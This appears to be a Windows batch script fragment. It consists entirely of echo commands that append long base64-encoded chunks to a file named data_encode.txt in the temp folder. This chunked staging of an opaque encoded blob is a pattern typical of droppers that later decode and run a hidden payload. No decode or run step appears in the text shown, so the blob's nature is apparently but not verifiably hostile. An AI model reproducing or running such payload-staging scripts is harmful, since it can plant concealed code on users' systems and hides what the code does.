echo MoitRmMeT4bm8fZoHu+gunk8aGoNsU2kpPwy6OPotK2CkUOr8O9iPKrWIxOjDttp >>%temp%\data_encode.txt 
echo dwmOvZM+a7U+eLBT//0E9ME7HvUwaFY/UkH7LJ2La79TXrV//P9vn1aaWMf7cR7P >>%temp%\data_encode.txt 
echo Z9R7nJjHP2lrfFbgmYqVsY15vK6pP8lj1kGxjqMcFVcrY2hVtlLpREelMPeOqCu0 >>%temp%\data_encode.txt 
echo EXYc2rcjwV8mlM3/0LWbNm+a3Dz5tml2iAQZVeJ5ur5HFsgfIMW+i7T6T0h4LSj+ >>%temp%\data_encode.txt 
echo 5Roh9tBtNXL4kNi8Tb1nHNl9eO/NeONH/BfpJh3ZcbZ1SvsLdEUljn7typiLJfZm >>%temp%\data_encode.txt 
echo YhKOIlqnWRTkvIpfoL97NI/ngHeqNzWIjWPc+I1lWc0hviXzu8aElhei95RmLqFf >>%temp%\data_encode.txt 
echo Yt6efaxoiT9melvmqsyL5zDQ4ulMM09mbBY0y/QrTOeZfoLpF7nM+cwpwm5n+h8s >>%temp%\data_encode.txt 
echo +aPMPTlLfKu06KXFdOIL5m7xdYmo+1dzV6UlPuUtepYYzaDFH1KuJX5S3p8rihtl >>%temp%\data_encode.txt 
echo hrDVNHILLG8yfXceEi8D7CminhgrvV7yaLuDbisfKFniTkZdZHoiDx32ZKHPp8uQ >>%temp%\data_encode.txt 
echo 7KR6nmUdSM/Cm4EldnkPUM2yAHoxhzKXAtC3e/tJ87qL9I9ySL/goBefd75Fdf6J >>%temp%\data_encode.txt 
echo A/k3uc41LrAfSCD9aAX0x1nQ35QP+564Qj1NixcJlRZDCWBdueh54tcqB0jnJ9Og >>%temp%\data_encode.txt 
echo 9zEd9UAXXdAs9cgSf+ZjZJa4rRM5aLvoI/1wAfQfWP4Kt3Uv9zTw0NO/514UXOi8 >>%temp%\data_encode.txt 
echo P4+2bqts9C3xAx690w60DUqg+7jvQ9R3rIB7UsouT/DaOOE9kZ9h7jEyti7kv+aD >>%temp%\data_encode.txt 
echo S9FfQXzSV5zF3KuB4lzmXiuAM2iHAPdq4U/L4CTn/bCsuCJzzzNH88zck+atxRla >>%temp%\data_encode.txt 
echo o4PMLaXApencB3e/qbgR4VCdqfQF8yniNjA3VgCX1dyPmatq7uk8uE28WwoikBfM >>%temp%\data_encode.txt 
echo GbGFONQ5VQY3Kd7G3F0FxU0y980SuK3iOuY+UlHcVub+gkvuEUd5M72PxgzcCZGk >>%temp%\data_encode.txt 
echo 9sgSIm5Wc3/I3LvFSeaeTYA7QrsU3IwBbk6cYu77zB0XP8/cziS4O8R7mPsOcyfE >>%temp%\data_encode.txt 
echo aZEhrkwz9RTVca/wE3zzE9fS3OOJbm6d0c0lVpV8M9nN3bgq76FVuIeikoF4PLhq >>%temp%\data_encode.txt 
echo DIvd1p7EsPgrG/QaTicc0Des11PD4uv2f6akeLX0E6IvVJKmVXjNtWmNvVbMEK1b >>%temp%\data_encode.txt 
echo oP/O6bMB6DzTY0xnQAtvcPlfSUNil0B3eB7RF3NIf7Uoqcy2EtUszkhKi48zNfLI >>%temp%\data_encode.txt 
echo dbj+N0zQ7/mgj3AN/2OiBs8C/RHLFwqgn+Xcp5n+mwT9L6avM32OSx70QPdy+j6m >>%temp%\data_encode.txt 
echo x5lOF0pEv1GsonU5SPT73lUjEM3ysBmIvxZJor+TAP1nTr/E6SMG6HFO+5RO8Egm >>%temp%\data_encode.txt 
echo xGv2VSMh/s5Cut9BusmSs7akMh9m+iLnPsr0GaZ3Mi3Yo5T7DNezj+hkopoaMycT >>%temp%\data_encode.txt 
echo 4+Ymop9IThL9jDFF9Nupm8z/BRwpZR1SMgCAQ0vtfQt4XMV18Ll3n1pZa+1KsmQs >>%temp%\data_encode.txt 
echo o2tjwMaWvE9pZWzj1T5sxZb8kLAhmMir1cpavNpd765sOUCQQiiP8HJD82oIOI8G >>%temp%\data_encode.txt 
echo N6FpXoUAoSUkaUjoX0iTJvyF/JDkz09Jm4T+TUn+Bug5Z+bu3V2tjSnQL/3+7H73 >>%temp%\data_encode.txt 
echo 3Dkzc2fOnJk5M/dxzvErt5kHMKyatiJ8O+xAyp/GnrXCP2GvWeHV1t3EAfdLGO5b >>%temp%\data_encode.txt 
echo cglJCWU/wpOLtylWXIYOYLiH4ydVI/5f1AkML+P4S0xG/AumKQx/0ZEh6e2gWu5y >>%temp%\data_encode.txt 
echo 5jD8IMN4G8U87SZ43E552q0E7+XUxxleznmS3Ms3Mtxip/h/Qm7voi/w4Tj8dFEB >>%temp%\data_encode.txt 
echo OWBeJbD/45y1qPBnjP1Bx6O4VpjgPsbeDx9d/C6LCR6S2JV2wp6V2Cr3uxHrPFdg >>%temp%\data_encode.txt 
echo z7XeYDHDxvONUswQY+wOuK91B2Kj54ucbUuOIz3FNUZOG1y1RqTdvPgoYrdLbJPj >>%temp%\data_encode.txt 
echo KEq4j0vse5ajKDPvk9idrqMo075TUUojPC3T7I0fsNDTGE6zv90+hfLOLrGGNsKa >>%temp%\data_encode.txt 
echo JfYNC2EdEntiCWHaWr3ME5ZFcMM6wubh6eZPW5rg6+tEzseb7sQb6b+R2HjrX1gW >>%temp%\data_encode.txt 
echo w/dETrzuQcT+ZZ2gZUXrNywu+HeJfcbxpMUN5m6BneP6e8T+tYewa+GFRT+0tMIX >>%temp%\data_encode.txt 
echo 1xst6oCvMHa84zHXuywd8Ox6PefPEPvfHiPnMvg5Y++3+xr+xbIMfu0Rfetr/zfE >>%temp%\data_encode.txt 
echo tniN6zrhIa9xXRd80ytoGTf/1tIFz0psymSyrgCzT2CHFIf1HFglsb9zu6znwg6J >>%temp%\data_encode.txt 
echo tTedZV0N75HYbPtK6wVwj8S+1rzW2g1f6xfYA81+63pwbTBq98JZG4z2eWHdBpEz >>%temp%\data_encode.txt 
echo bt9s9cIdFxo5g3BnFXbPhcZ1QZjYKFr7V+6t1iDcLzGHep/aCz+RWHHxsDUEX9sk >>%temp%\data_encode.txt 
echo avgbxz7rBnh8s1HmRvjeZmOEbIRnJNba1ozYTyX2/iUTsAl+LrG7liiIvSSxAccU >>%temp%\data_encode.txt 
echo bIZXJbbd0YyY/SKBudsn4CJoltjKdgWxpRL758UTsAVWSOzVxQpiF0hst2vcimuw >>%temp%\data_encode.txt 
echo xC53TSJ2ocSOYtoARCR2LaYNwA6JPdowBREYldj3G3CVhMslNtnA2swSm8W0KGQl >>%temp%\data_encode.txt 
echo 9seYFoMjEvsspsXgGokNYFocrpfYKKbF4XaJfWbxIetW+KDEHlicR+yExJ5wTeGK >>%temp%\data_encode.txt 
echo f1Jiz7iaEfu8xG5vnoJBeEBin2xuRuzRi4xeeRs8fpHosZ80H7G+DZrDoje/Y77G >>%temp%\data_encode.txt 
echo uh12RQT2bss11iEwR0XOz7Vdb94JGYldabnJuguel9jnl1xj3Q2fiRk1jMCXqrCH >>%temp%\data_encode.txt 
echo q7C/rsKeiIl59Odwm3UEhuJG2ijsrcIOxEXOlzDnKPxNRdrF8PdV2LMy53eV26wX >>%temp%\data_encode.txt 
echo 837yX90EX2WYbyXYQLeQ8FPel1zXTvBDiw340SaCH3fVXkVQhW2c+hS/GzfiFXie >>%temp%\data_encode.txt 
echo HmXCVg6fpHfjcM8Suh96mj4PwLWtNn6Fg2Jy9AAavr2kNj7C5Zfazixsgq8zVUeZ >>%temp%\data_encode.txt 
echo BnpDXi9VxKzl8FZuyy/qUmWGP2YabmTavmqh1BhzKeKmsOBYrtkIv7TozYer2nSo >>%temp%\data_encode.txt 
echo wp0tRriL43/CPXU/hx9oMvKcbK2EDfCoS8G9P42MpQgdsAZhM8pJgv0MwwwHGe5m >>%temp%\data_encode.txt 
echo eCnDBMI2SHP4MMNjDE9yaS8iPAsSyp/jSkxwD6SVdyqX4mq3CiVaQgngHD2srHJn >>%temp%\data_encode.txt 
echo MIbyJ5TGlgJ8mek5poRwHV4EX3JdBa3wXNt78U7lUdftmH/W+X6MeXHJnXCjAo1W >>%temp%\data_encode.txt 
echo zH9lG137YPsJOK5MtH8Kr3oK77OOY2mPwoe45A/BDUsIfnMxwactT8AJ8Lm/h1fd >>%temp%\data_encode.txt 
echo 1/oUrrOU54TyB20/xvKb3S9CJ8d0wpOWVuWkclNrp/IIx5xUrO0rMNzVdJ5C1/Yi >>%temp%\data_encode.txt 
echo /Nv2bRzernwZwyMcfgfCv27vVB6D+aaUsgpbcaOyjluRUC5s+iCm3tF0J8OPK52Q >>%temp%\data_encode.txt 
echo c7YqjynUoufgOtw3PMlt74Rb2u/H1Ennw8pTylfsTyG8d8nP8apHXf+OcI9dURPK >>%temp%\data_encode.txt 
echo cecU/KMy32RTicNN6m9wH7JSVTDParUB4XqEmxZvRPhU61aEcfswwpcXDWMef+uo >>%temp%\data_encode.txt 
echo ukIdbb8UrzUj573qe9sKqle9qWkWY+ba3qVSLTeo/6hkTX+CJQ8334vhdyr3cfhh >>%temp%\data_encode.txt 
echo Nax+qv1b6lKlz/4cwl/Zn1d3q083vqiuUR7BvapXvdQsSrOYEkqmvcmUUANNUdNz >>%temp%\data_encode.txt 
echo PEIalO+2zpq8iq3hPabD6vmOm0wNyvOWO7HXTthvx/D/c1jhmMpjTH256bN47Wfa >>%temp%\data_encode.txt 
echo v2iah2scX8Hww45HETqc3zZ51Zy9gFTdoT5jegwaHT8xfVn5DFJ1XPnU4ttN8+o9 >>%temp%\data_encode.txt 
echo TSdwPDxpuV+hFnWYjysPLOkyB7BH+swbuUc28lj6nGJvvBThfNMUj71Zc1o5rFxv >>%temp%\data_encode.txt 
echo HlSo3weV7fb3mQl+2DwPlGc3xn/OfCnCh8wn1fW4Cp9UieYTDL8MZzvvxHvaRvi8 >>%temp%\data_encode.txt 
echo tQda4EGEy+B/IjwHfoxwLd6J9eB9LMELGUY4fjv8FuEIx1zGMAmtth44BJsRFmG7 >>%temp%\data_encode.txt 
echo LQxXwocQXov3EgkOJzg8z+F5Dp/g8AkOP8LhRzj8HIef4/AWlcIHGM4xvJvhjxmC >>%temp%\data_encode.txt 
echo iaCJocbwHIYRhkmG1zL8OMNHGW6xMW0SUi0HOJyQkGLmODwvIcXczeETElLMX3H4 >>%temp%\data_encode.txt 
echo EQkp5lkOPychxYCdwoqEFKNxeIWE3EYOhyVkejickJDp4fC8hEwPh09IyPRw+BEJ >>%temp%\data_encode.txt 
echo mR4OPych09PAvGK4heEBhnMM72b4VwyfZQgOzs9wC8MDDOcY3s2wFX6Gt0s/N3vg >>%temp%\data_encode.txt 
echo RbN4/tckn2w65XmxPDfLcxeeffwWQGGtY3oyM8hPrBWY5aeMuGLxk0cF6BuEc/FM >>%temp%\data_encode.txt 
echo XymcB+Lxw/l45f3wv+B5+A1sUq5Q7lG+oHxdaVGT6q3qHeqd6gn18+qj6vdVMLlN >>%temp%\data_encode.txt 
echo +00TphOmJ0zfNb1getm0zXyF+RrzzeYT5kfN3zI/abbzsyYLzj0btPFTzXfY77AC >>%temp%\data_encode.txt 
echo dLQR/JaF4HeXEHyi6YMIJ1s/grC34UQ5z8eXfBLhLQ4K97dT2NRMMOE6ifB6hv/Q >>%temp%\data_encode.txt 
echo QKlXMfwCw0sYPrz4XoTPuSh8svkOKz3NMuH614IU0fe4NqAvdxtYc6UR4VLkrIrc >>%temp%\data_encode.txt 
echo WYxwAz8Hu5AeaaNsaAHabbdgeDNeQTvoNgxvgXYMhxGqMIBX46qPUMU97TIMxxCq >>%temp%\data_encode.txt 
echo uE+lp2RbEeJ+iHtmEKGKu0vqle0IVdjBPTKEUIVh7o2dCFXYxc+/diNUYQ+uxwrK >>%temp%\data_encode.txt 
echo hDWkV4qSQ8H921p4B1wHTcq1yh8qHnPYfOA20jL/AcJBWH07YB2rjwPW8QOEO0D7 >>%temp%\data_encode.txt 
echo Q8A6folwGObeRzr55jmQI0b/XbvY0Pen31Pmj/Lzxuq4ux0L425y1sb9yNzaAvxN >>%temp%\data_encode.txt 
echo ispcOQsP4kgnHsSNs2mHgr2gIf9W4LESj3PwWIXHuXich8f5eGyFL2Ibvoj7i27l >>%temp%\data_encode.txt 
echo MLxduQ1eUI7j8SRsNz0JO/EYwWOf6Rk8b+Xwn5p+heftmOdlvI5/Y2Mj7PggXCgk >>%temp%\data_encode.txt 
echo jg1m0+w9j/zVbfL6PKdJDZ4u0dvngXgoHIp5ggMDkUgk0Bfo84Ui3l6fr6/f7wvG >>%temp%\data_encode.txt 
echo feFYX9ATi3l8oZA37Iv3RvtDgYFQOBAJevoDA95IzAMbNyfHxqLpYj6TOBbJJIpF >>%temp%\data_encode.txt 
echo zxhGkmuG2GwqOVNKbR4fG6ubzQvF6fGx8ZnJyVRh7Ii3BvchXluMF8iOM54GY9mZ >>%temp%\data_encode.txt 
echo 6VQhMZ5JHUBs90yqcExHZFIpV0BsW6I4NZIqYWhHukinyMiqjZtDY2OZXDKRKXph >>%temp%\data_encode.txt 
echo Ipkq5JMGFXAwVfL7YDQnXJJiQJxPzcU+X73G+Woa56tpnG9B43yicT6IptlydaJw >>%temp%\data_encode.txt 
echo 7ICvhl4f7EklJpAiXy3hp6XQX49Cfw1F/pq6/Kcp0ecJCM70BsDf3xuJR4L9wbAn >>%temp%\data_encode.txt 
echo 0huMx/vj0UA43hft9cd8kV5v2BvzD/T2h3x9vZFopN/nG4jH/f5ooDcQiIXigUig >>%temp%\data_encode.txt 
echo Hm2BGloCEAvFggNBb2+wzxMIxvp9kXAwFAjG+4OBWMDnGRgI+gPxqDfii8X9fX3e >>%temp%\data_encode.txt 
echo gXjUF4wGQ6FAv7cv1huOBOvVEqypJUid7+0VLcPzadof7AV/n8cT83qjXv9AX3TA >>%temp%\data_encode.txt 
echo G/B6w/6Ity8Q6RvoiyMPQn5kRijkC8e9wd6oz9MXiPv7vQM4o2Lhvj4soA5FvTUU >>%temp%\data_encode.txt 
echo nY4Gr78PfB6vL9Yfjnlj4Wi/JxIf6A31Bbx+b683EOrDnvB7I8HeQDAYH+jrjyNR >>%temp%\data_encode.txt 
echo /f3Rvqi/LxSPhkPR/r4QNXjs4tE4B0I4JHMTM5nUZti4q5A+kiilBqfzmRSZRE/Q >>%temp%\data_encode.txt 
echo iIymSol0prgZomF/sD8Wjw7EA6EBXzgUCvlRlkT9oUjc2xuK+/p84YFgMBiO+mOx >>%temp%\data_encode.txt 
echo aMAXRmkSjvSFkBN9EU+vZwBGhgagfyAa7IuH4kFvCOWNp68/1OsNYV8GQ56B3ojX >>%temp%\data_encode.txt 
echo H4xFw1FPtC/UH+2NhzyxUH8g1B8P9GPNEW+gPwbDozuGxiLbwjt2xIa3xsaGYiMj >>%temp%\data_encode.txt 
echo 4a0x8PfGPF5vYMAfDnoGIqFYoK834AlEUXSF+oM4cLG3fDGfP9zbzzwKBvu8gVi0 >>%temp%\data_encode.txt 
echo 1xf1+EN9yCbYNzQI0ij84E6gyTa4CyKD0T0wPDA8AiNTiUJ+W65YGsxO5np2pMdh >>%temp%\data_encode.txt 
echo upjMFTIYkFdFcplMiudwsWdrKpsqpJNANlqI2aNTBZzBEJ6YgDgyMzXBsbFMIl+U >>%temp%\data_encode.txt 
echo 4Ugum8WrEZssTOeLY6VCIlucTpeMmEIqmUofQXRPqpgqUIDzCIP3Y+kJ2Chq2Xxo >>%temp%\data_encode.txt 
echo bGwgkTyUzh6Mp1MZjB/B7OlkamFCNFuM5qZRIA0npuskD4+XTpeMV0dy03kUZIVT >>%temp%\data_encode.txt 
echo Xn/6DDSqF8ayk76JnYfq5E9Pp3BiTOcXJu0sDsykMxPCfWMdUti10o5EdiiRTRys >>%temp%\data_encode.txt 
echo l2NncShxRa5+QjqbO2WZO4sLU8K6A7s6TUBxnyrVaXSuUKrf4NxMnYTh6J7ewMgx >>%temp%\data_encode.txt 
echo nKKzCxK3pkoiwBwBcoIL4XyeTntSKHaSKR5xclRAHMcjSgAReXE2naTwyFTuKPuZ >>%temp%\data_encode.txt 
echo 49ihVJHDdEmqEJkijyhZxEcTh1JgLMowSHItV+RwuFhen0G4B4I9M9kSNoiJ25bI >>%temp%\data_encode.txt 
echo ThhRNBBkDFJPWLyQm5YxREG4eCyb3JdIl2QcEQ3SDQRwgTTC5Exiv3xlvGqQQ3FB >>%temp%\data_encode.txt 
echo DOWpGumcpzpmJJc8lCrtZP+OlQVXDm+96Ko4WfiCfLVxiWIynR4jV4BweCZV5CnN >>%temp%\data_encode.txt 
echo WHacT8QOajMNCIiijObANPEOiC07syneJJAzDCi7xRCyB7nJdXJAdiWH9yYyMyK0 >>%temp%\data_encode.txt 
echo q5Ar5ZK5DCPJTJHPsidk4zlYpq3ECbrgK6RYrM3geSR9MJsoUWhXqcAeh2eSAhUO >>%temp%\data_encode.txt 
echo LkVhGJ2aRjmWxx5MAXGAB0s5JpLJIRSjSVyKWGp85iBO3YFC7igPMVoiaRBM55Ex >>%temp%\data_encode.txt 
echo BRa55IQsXCoV0uPIWdg6k67AxPV0YW1cRZlGEpa7N11MV8WFi8XU9Hjm2Gi6VDe6 >>%temp%\data_encode.txt 
echo kJhITScKh4wkMd3jBWzh0VxlAnt+LpZy0wuLoX7emyqQE9CFiTjmJ9MHZwq8NC9M >>%temp%\data_encode.txt 
echo jqaKyUI6X50oPV2Hi1WtQ65xIXtSmcQsh4oLy8OBMYEdWI+O/DF2S1UvaTqfyB4z >>%temp%\data_encode.txt 
echo EuQk5/hSejydSZeOVVJX3hDDwDEER2hY4mjm5a5m4U3N8qCmrRB2Hq6D6USGwrSh >>%temp%\data_encode.txt 
echo LVJAePPG9XsiNYtniofJTOKgPljFGokDEeUWSjoKyBRJZY9kPaXoHrOpt2So7L4T >>%temp%\data_encode.txt 
echo MrmDYvzAIC4dpeQUjJRy+aMcwnZOQWEiUUqMZdgFHc9EfWGDvB5gsUYOpsZRgPNE >>%temp%\data_encode.txt 
echo LiPhDG4Gt23N5MYTGZz+qZQelr0pZlqmSjTtSB1JZUA0cVcul4FSKcOikuZbYhqm >>%temp%\data_encode.txt 
echo E7NjRBSZ4aM5z2eibBAZwDKCAzgXZ1IXI3P34ZDlGMEiGC2kEdAijB0sxzZN3h0p >>%temp%\data_encode.txt 
echo HaNOMjBKG0rMVifLiHRxbLyQO4QhGgByWye8do7tSR1JUx/AhBzoeh/tS433jPAA >>%temp%\data_encode.txt 
echo 7xmRfV+Vvic1KfdguFaVKlkDciktu+kVqwYRhDKRNg0c5C4yaK0efSiMx6YwPJYW >>%temp%\data_encode.txt 
echo SbmjO3IHMXAonReSVt+eCHFbxmhc6BSiWD6M4i2VKACuowUY3CW2LFxA1SaGC6mO >>%temp%\data_encode.txt 
echo Ed1Ich6R0dRsSQbFIoE7RCE+x6ZEtBiyXABiw6kSiaDRHDVnZ4GjkOkjI7sG+G4Q >>%temp%\data_encode.txt 
echo 9Mslms3pW055uygWs5qNlFjNaiOHwhHmZIE3zzIo2CoRfYskUV6yFjZkMpej6AGc >>%temp%\data_encode.txt 
echo F8KJvSwRF4pcBnHQV4xyhHR+BW9LHEmIkaIPlDKPeZ8nuSvCR8SUH5tmTOaiTZ+e >>%temp%\data_encode.txt 
echo i8PlXIyx82Zg/+CVTx9IVFRgPUkB+WTwb2exgm+ITOL8Hssmx4s8RTkgx0s0nTiY >>%temp%\data_encode.txt 
echo xQ5LJ4tUdPgIrrO0UIlJXqRhjhNKx3gU5kqJzEgqmctiBPZgrkDZqqSo3PoVa0Uf >>%temp%\data_encode.txt 
echo 3vWkCrn8qZL1pbacLpZPHGO0fyyC8Ac6lpvkrUsRyhtF2r2QaGcCRWA4dTBXSuN6 >>%temp%\data_encode.txt 
echo HUfhjHQWxiY5IEQjuSHjByMQOzyDd8S01cO70GyxUhDEZkvSVXZZuOOUQBlwcCaT >>%temp%\data_encode.txt 
echo KMRm8ziMRDLtfZHKsWI5IkGSwcCJ62Vk4f2cnEnsbV2IkyKk80WaIvp9mpwjtZwm >>%temp%\data_encode.txt 
echo n50UK1moo+nJghjnYn7xKCrHlouU0eVNV5IeF7A8DyeR/VjXjDgP7sI7S2qt2CvL >>%temp%\data_encode.txt 
echo cGIikcf+HEtIXLYL5UCPkIwyu36zAmW/21AmITGO9yXYC7PpIkWnx0pCjGI4Y4TJ >>%temp%\data_encode.txt 
echo PesMd1IyUYJ4rjCNJylcsJcKeI8KO8evQG7CQArHi7zZpQGNkoKefGEPJCfobBAJ >>%temp%\data_encode.txt 
echo k3ynjANcDGuWHkKyimAGaRorifAALyW7uFt1US8aWbEUCcG2E3cK5WjqpKronDjR >>%temp%\data_encode.txt 
echo Ugzc39R2QUE0NZmYyZRgkFdtlDiECPklkcFdPpxCODQIVriWqxkUOsfF7YpY82RB >>%temp%\data_encode.txt 
echo NM4Ji5DzZXJkGTtC6OCuWBZX9DTlI1ew9LSCs8g7HgoVp8dFAIVoUYSw59lbaSIz >>%temp%\data_encode.txt 
echo JgTBWFLkoGFWFLNYRhmDTFyZLaIUlQiuYgUiiSWw2MngqOCu4ECewI5EscS3IHyb >>%temp%\data_encode.txt 
echo kqMHr7wZo5u0EtCyWV4jsW9Ajh3AEbI9dWznTAnvhYD8OQ6T/duK+cxl4maIwyxB >>%temp%\data_encode.txt 
echo jVtfIUQrcHmTUZWlkOTNIJZzECE9TBPLAT9bw/VCP9NyLMLkubWMjAkKyxKIwnKG >>%temp%\data_encode.txt 
echo xRPT6cwxGMCN2iHaDxs3MpDLj7Hkwp0ubg+HZzKZnYXYdB4xftUVZevXwhq0xn4A >>%temp%\data_encode.txt 
echo CuzVqMSWtGFFdXq1nz/Osby2hClp0bne9br/QGHdnHNYcLsHMDha9mYgPC6l2APB >>%temp%\data_encode.txt 
echo RMXVuleBSho1tgSvsf1pYdEdGrIwzham6ZXTiMxdYp95A3iMsHX4ylbUq4UsT4MN >>%temp%\data_encode.txt 
echo pTGWBRdWljICQ1jOmZdxFMtI15SxD8sYPPMyLN3IG6WpG7qZR+ShQlkxKjkp+HGI >>%temp%\data_encode.txt 
echo PQZsYN8MHriaWv+eow64GMkNw1aIYZJuWHubdJZIBsYn2aHhZZKhM1wgmR0nw+z0 >>%temp%\data_encode.txt 
echo v5zMUmIJe7CMi5HoGDJwFMs0SiOiKjtknYxNy3S9WwdhF7uqISPwBWm6vdaRRXXH >>%temp%\data_encode.txt 
echo kmHww2xgv8CDYU1NnYYhfb3Okkwf5paMSzcNoo76A8kog4yz01Alo/8zbIh9AztA >>%temp%\data_encode.txt 
echo 8OC/tubKIbyOY6dlerRuLZX5NR4Owv1KkXPm2EB8vdqDdWqvHjKi9qJMF65dkmyg >>%temp%\data_encode.txt 
echo /hg7AJrifFMLhppw5JUrO5bQsUou1aNIn1rrQEyNdSCG9xoeJzG4BMfKEPb0DgyP >>%temp%\data_encode.txt 
echo nHbM1Y6bTcjrfjak74VeCPGZjtdTQhrb34OhWeZz7SgpYo4A8lPnmNEW0YY3Tmv3 >>%temp%\data_encode.txt 
echo gnjh5kM/1xs/m+QY85y2/jSPxXp1rqsb71vQyv9c6esxzlOeWz6mUx/vOt16TToX >>%temp%\data_encode.txt 
echo lSYRn8T8/QBNezFedyAKnBbko1diItwvMS9e58V+IsyHZx+7NICmKLt8OMSjWL/O >>%temp%\data_encode.txt 
echo jy2YRGybdL9XgL3ltCimJsplEv8NjPpiooz18RjXMZJPIYn5mAIDozIq2zBJH4k0 >>%temp%\data_encode.txt 
echo BYD+VKYfsT6IsLQKVdTgwRgPQNtelmXkaoIci5CrwNlyHipjslyTXrbAiP5QBTYp >>%temp%\data_encode.txt 
echo eRcCEdNXwTviGLTrbm2EowdyYrIX56WeqxcpxXa0X8LSvsgjscByQc+ll+ypaC31 >>%temp%\data_encode.txt 
echo JywdxJlNfyGft/LY4avahEvEGaSuB67gUrMAa4T7q824koilaR2OFuLr1XKx8ko3 >>%temp%\data_encode.txt 
echo D0r4MriAc11cXvzFUlZPNulXbsCzT5YALcPSidERlmg7UQLBUK0b373Saa0unUUd >>%temp%\data_encode.txt 
echo PbI8rcJRjybL1rCXrkSOXQ0QeeOlwbnVVO5AiTksXS3pDiULvC0TWxUa99PSDZNW >>%temp%\data_encode.txt 
echo dnYC5+jpEU7PsywR6105z/nDzLEBnOs7T1fW2tp8pymzzdh2CKdRlA/OPwbi343t >>%temp%\data_encode.txt 
echo GEI4wS3ehv8N7HRqA6/3SoPex7D0MljBoTjTk+Ee5+3gMupLPdVwJSa2iiQ/FdMm >>%temp%\data_encode.txt 
echo 5I/huClVpjJVzg0mzGchuaS0LFw1laWnWseohjQorlqJrzR0s5zMc6mlcg5jdVFs >>%temp%\data_encode.txt 
echo Qh5SCdOy1mpJr9iCMkcUOQyL9dlA8uhqUMq4n8eQYtqPc0+P663K4RM5GgTtXtzy >>%temp%\data_encode.txt 
echo ipBP6L6C1I0N+7msIMoHLx8DONYGkKd+xAIocUOsEtiPcUEcG5QSRyzCfz/JmAbB >>%temp%\data_encode.txt 
echo FU85hHUtO8zucYrlHc5Y2aEetJEDONp/pCtju4g/wjU29cJYzS4Qlg1wr4ktrMYu >>%temp%\data_encode.txt 
echo uYSkL+E418fbTrl7Ikd21IeGo21YEcDYIEvQCB5RlsTiEGsBzN32DtzOXAb7sZv3 >>%temp%\data_encode.txt 
echo IwP389b2Srl8epidtAnuhncii7rh7eXUEKasgVVwFVAJ+5FsEU/igEp5/TFUmjJ3 >>%temp%\data_encode.txt 
echo /B1vSmGiMW+8HCLpxO8Oj/bjxqMO10w9AN26CBE3FAUWmwflvagQv91l8aukwjyk >>%temp%\data_encode.txt 
echo UgsGjcbbiSQvfAW53IjtsvBkpk9r3deZfosyWc6Rkf7sVvB8e+yhVz616bf3bbm1 >>%temp%\data_encode.txt 
echo a/fKD37t/KfBrCmK3YQkWDDgchHqJKAyPrPWtsR9oM0dU5xOVXVPtLkGFad7SnVn >>%temp%\data_encode.txt 
echo ljvV5U67O6+6SzI4awHV6XRawYTQaQbF7rTwlVg61eDEdNVux8JVSlWcdg2ovBaw >>%temp%\data_encode.txt 
echo cLFmjb7X1FSls8MKiuqeewQvUukip3NRs6IsPxva3GnlbDA5FKfDZnGvcg+5dqsq >>%temp%\data_encode.txt 
echo pqmqSDmbzHa5duN1TUxMp8mmcF12u81qx59qt4GqNNub7S02a5v7UiLYnVBlSMbY >>%temp%\data_encode.txt 
echo kIYWaFHwQqYUEzwKlu60OxSRg9vY2emw2ZAr+HOlVKvTBmaK7LQ2K7Ccqey0EhHL >>%temp%\data_encode.txt 
echo O7HJTmeHrVFcbHe2uaeZn8jRVe7DFqKdmYHRxAxKxUuQfZrqZIZhzTa7Kn9mG3IE >>%temp%\data_encode.txt 
echo e0dtAaumtBCptsWuLVggMd5u43IPNyPH2txzLyoVXDMRGwnnaOrg5Saqw2SyYCuX >>%temp%\data_encode.txt 
echo Wxhi+63uufnlFvfcdVQQRrqvdlqRJ+6r7Ys0k+Ka+41r7mXXvOIgZN7imm+wIyGK >>%temp%\data_encode.txt 
echo e74Ji7Qvt2AfuK9uQD67555xzbc5bQ3uUSyd6MKhYgFwzy/FnBjVoGHMcqcLa9Oo >>%temp%\data_encode.txt 
echo Ayw2kxOHiM3sHqX82HsWbK3Vhny0LrfYsS+sVoywN2CEXUTY7Vabutyy3LIILFSh >>%temp%\data_encode.txt 
echo nQ57g83knjvunvsjogxDTju2Yu4W1/y5ZN1ofo17vhtR1Wo325AHNs2ExBCnYbnJ >>%temp%\data_encode.txt 
echo a1tjt7u2uEKugGujWvmzuwLqwp9rC3a4YmcG2/BowMNidiiugM1mwTapzhabgwhE >>%temp%\data_encode.txt 
echo fiJxH6LhvNzSqJkxjLNmPthpQX7N9yMHVLuK3SbHsoDEDNdV9g7XVVTkVdjgDrsd >>%temp%\data_encode.txt 
echo zAqS22GnC+duwRHd2YFnGucdyDJ9rNtV5BLWbMcedKUcbqICh9Nyi+sqjER6Rs+i >>%temp%\data_encode.txt 
echo IYkTlJrR5po7IQYlRyHbsGdMchTdWabHypizgaYuXoBDUFy4wtaJfYstw79qF9Xj >>%temp%\data_encode.txt 
echo iLUTwie1yeZowJ99ubNBbUDSTApOFpvN3IAXNCDtDU7sSPfcJ53cY59sECfnYhsy >>%temp%\data_encode.txt 
echo 7aR77l6SP4dVlQYdDphB1/yQGHS7rdjXq1WVTutUFUtU3R6s8r537t+7NPDsjXbv >>%temp%\data_encode.txt 
echo X4b23ts7HFTPblbPXqmebVWtqsnq1nQBYMKhhQfZ4VWtSBkirpDZutwVwMBGzHkY >>%temp%\data_encode.txt 
echo zymz1TV3M4EbCHyEwB0E3kPggwRuJzBntQqZZ3VfjscBPCbwyOBRUq0O1WrF3lDc >>%temp%\data_encode.txt 
echo GsHlTnLuhSG7W7PjpoSp4eTRBhyuq1guNGiKFDoOnCJSUNEM0xBXpORyiOwUNOP0 >>%temp%\data_encode.txt 
echo WkVCDjv46kWamSSIFFqaiRCskyqxk3a8isPSjiebODXQJAATDVY7CUrk/C1OijDJ >>%temp%\data_encode.txt 
echo CNcWDDhIqElRBmYeUygQFR5VXG+zexTzuEebOYjC2EILCokFV4pXlRTORrGmYD7F >>%temp%\data_encode.txt 
echo 2cxhErQNlLHTtBqceKjm1dhKk50ROx4WjMBrFekM7myygzGqLtlXSOSHc9nyW+rR >>%temp%\data_encode.txt 
echo KfoyRcF8Nv7m3a1AU/U7aZQUlNCugLv8TYb21ZOa5vP4cG+6RoFVfcGg39MfDHaH >>%temp%\data_encode.txt 
echo ApPB7kDA29c9PuGZROALePs9nv4JL+4YF2Ed3h4P/fEWToHOnuHYaPnLlXXys4hN >>%temp%\data_encode.txt 
echo RwI9fT0+JNbZWk6Un7PS4+9Wukorp2icmzVA7FUf7b/ganpJ2qBhu0R33IpHvtpn >>%temp%\data_encode.txt 
